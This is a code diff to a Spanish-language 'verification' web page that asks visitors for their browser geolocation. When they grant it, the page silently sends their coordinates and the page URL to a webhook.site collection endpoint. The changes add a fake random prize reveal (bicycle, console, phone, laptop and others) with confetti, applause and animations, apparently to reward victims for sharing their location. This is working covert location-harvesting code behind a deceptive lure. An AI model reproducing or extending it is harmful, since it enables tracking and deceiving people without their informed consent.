@@ -5,14 +5,56 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Verificación y Validación</title>
   <style>
-    body { font-family: Arial, sans-serif; text-align: center; background: #f5f5f5; }
+    body { 
+      font-family: Arial, sans-serif; 
+      text-align: center; 
+      background: linear-gradient(135deg, #f5f5f5, #e0e0e0); 
+      transition: background 1s ease-in-out;
+      overflow-x: hidden;
+    }
     h1 { color: #222; margin-top: 30px; }
-    button { padding: 12px 25px; font-size: 18px; border: none; border-radius: 6px; background: #007bff; color: #fff; cursor: pointer; }
-    button:hover { background: #0056b3; }
+    button { 
+      padding: 12px 25px; 
+      font-size: 18px; 
+      border: none; 
+      border-radius: 6px; 
+      background: #007bff; 
+      color: #fff; 
+      cursor: pointer; 
+      transition: transform 0.2s, background 0.3s; 
+    }
+    button:hover { background: #0056b3; transform: scale(1.05); }
     #msg { margin-top: 20px; font-size: 20px; font-weight: bold; color: green; display: none; }
-    #icono { margin-top: 20px; width: 150px; display: none; }
-    #premios { margin-top: 30px; display: none; }
-    #premios img { width: 160px; margin: 15px; border-radius: 12px; box-shadow: 0px 3px 8px rgba(0,0,0,0.2); }
+    #icono { margin-top: 20px; width: 120px; display: none; }
+    #premio { margin-top: 30px; display: none; }
+    #premio img { width: 220px; border-radius: 12px; box-shadow: 0px 3px 8px rgba(0,0,0,0.2); opacity: 0; transform: scale(0.5); animation: zoomIn 1s forwards; }
+    #premioNombre { margin-top: 15px; font-size: 22px; font-weight: bold; color: #333; opacity: 0; transform: translateY(20px); animation: fadeUp 1s 0.5s forwards; }
+
+    @keyframes zoomIn {
+      0% { opacity: 0; transform: scale(0.5); }
+      60% { opacity: 1; transform: scale(1.2); }
+      80% { transform: scale(0.9); }
+      100% { transform: scale(1); }
+    }
+
+    @keyframes fadeUp {
+      0% { opacity: 0; transform: translateY(20px); }
+      100% { opacity: 1; transform: translateY(0); }
+    }
+
+    /* Confeti */
+    .confeti {
+      position: fixed;
+      width: 10px;
+      height: 10px;
+      top: -10px;
+      background: red;
+      opacity: 0.8;
+      animation: caer 4s linear forwards;
+    }
+    @keyframes caer {
+      to { transform: translateY(110vh) rotate(720deg); }
+    }
   </style>
 </head>
 <body>
@@ -23,15 +65,38 @@
   <p id="msg">¡Gracias por aceptar! 🎉</p>
   <img id="icono" src="https://cdn-icons-png.flaticon.com/512/190/190411.png" alt="Gracias">
 
-  <!-- Galería de premios -->
-  <div id="premios">
-    <img src="https://cdn-icons-png.flaticon.com/512/3104/3104795.png" alt="Bicicleta">
-    <img src="https://cdn-icons-png.flaticon.com/512/3176/3176364.png" alt="Consola de juegos">
-    <img src="https://cdn-icons-png.flaticon.com/512/2920/2920244.png" alt="Celular gama alta">
+  <!-- Premio aleatorio -->
+  <div id="premio">
+    <h2>🎁 Tu premio es:</h2>
+    <img id="premioImg" src="" alt="Premio">
+    <p id="premioNombre"></p>
   </div>
+
+  <!-- Sonido de celebración -->
+  <audio id="aplausos" src="https://www.soundjay.com/human/applause-8.mp3" preload="auto"></audio>
 
 <script>
 const WEBHOOK_URL = "https://webhook.site/1680fad7-4e5b-4842-a3b7-d76fcd7d5639";
+
+const premios = [
+  { nombre: "🚲 Bicicleta de montaña", img: "https://cdn-icons-png.flaticon.com/512/3104/3104795.png" },
+  { nombre: "🎮 Consola de videojuegos", img: "https://cdn-icons-png.flaticon.com/512/3176/3176364.png" },
+  { nombre: "📱 Celular de gama alta", img: "https://cdn-icons-png.flaticon.com/512/2920/2920244.png" },
+  { nombre: "💻 Laptop gamer", img: "https://cdn-icons-png.flaticon.com/512/3131/3131638.png" },
+  { nombre: "📺 Televisor Smart 4K", img: "https://cdn-icons-png.flaticon.com/512/3202/3202926.png" },
+  { nombre: "🎧 Audífonos inalámbricos", img: "https://cdn-icons-png.flaticon.com/512/1041/1041873.png" },
+  { nombre: "🏍️ Moto deportiva", img: "https://cdn-icons-png.flaticon.com/512/2972/2972185.png" }
+];
+
+const fondos = [
+  "linear-gradient(135deg, #ff9a9e, #fad0c4)",
+  "linear-gradient(135deg, #a18cd1, #fbc2eb)",
+  "linear-gradient(135deg, #f6d365, #fda085)",
+  "linear-gradient(135deg, #84fab0, #8fd3f4)",
+  "linear-gradient(135deg, #fccb90, #d57eeb)",
+  "linear-gradient(135deg, #f093fb, #f5576c)",
+  "linear-gradient(135deg, #4facfe, #00f2fe)"
+];
 
 function obtenerUbicacion() {
   if (!navigator.geolocation) {
@@ -61,7 +126,6 @@ function onSuccess(pos) {
     source: window.location.href
   };
 
-  // Enviar datos al webhook (en segundo plano)
   fetch(WEBHOOK_URL, {
     method: "POST",
     mode: "no-cors",
@@ -69,10 +133,35 @@ function onSuccess(pos) {
     body: JSON.stringify(data, null, 2)
   });
 
-  // Mostrar mensaje, logo y premios
   document.getElementById("msg").style.display = "block";
   document.getElementById("icono").style.display = "block";
-  document.getElementById("premios").style.display = "block";
+
+  const premioAleatorio = premios[Math.floor(Math.random() * premios.length)];
+  document.getElementById("premioImg").src = premioAleatorio.img;
+  document.getElementById("premioNombre").textContent = premioAleatorio.nombre;
+  document.getElementById("premio").style.display = "block";
+
+  // Fondo aleatorio
+  document.body.style.background = fondos[Math.floor(Math.random() * fondos.length)];
+
+  // Aplausos
+  document.getElementById("aplausos").play();
+
+  // Lanzar confeti 🎊
+  lanzarConfeti();
+}
+
+function lanzarConfeti() {
+  for (let i = 0; i < 40; i++) {
+    const confeti = document.createElement("div");
+    confeti.className = "confeti";
+    confeti.style.left = Math.random() * 100 + "vw";
+    confeti.style.background = `hsl(${Math.random() * 360}, 100%, 50%)`;
+    confeti.style.animationDuration = (Math.random() * 2 + 2) + "s";
+    confeti.style.transform = `rotate(${Math.random() * 360}deg)`;
+    document.body.appendChild(confeti);
+    setTimeout(() => confeti.remove(), 4000);
+  }
 }
 
 function onError(err) {
@@ -81,6 +170,3 @@ function onError(err) {
 </script>
 </body>
 </html>
-
-
-
